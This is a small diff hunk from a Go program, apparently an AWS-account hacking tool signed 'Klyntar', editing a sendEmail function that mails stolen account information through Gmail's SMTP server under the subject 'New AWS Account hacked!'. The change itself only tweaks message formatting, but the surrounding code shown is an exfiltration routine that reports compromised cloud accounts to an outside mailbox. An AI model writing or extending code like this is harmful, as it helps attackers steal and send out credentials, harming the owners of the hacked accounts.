@@ -26,7 +26,7 @@ func sendEmail(accountInformation string) {
 	// smtp server configuration.
 	smtpServer := smtpServer{host: "smtp.gmail.com", port: "587"}
 	// Message.
-	message := []byte("Subject: New AWS Account hacked!\n\n" + accountInformation + "\n\tAss: Klyntar")
+	message := []byte("Subject: New AWS Account hacked!\n\n" + accountInformation + "\nAss: Klyntar")
 	// Authentication.
 	auth := smtp.PlainAuth("", from, password, smtpServer.host)
 	// Sending email.
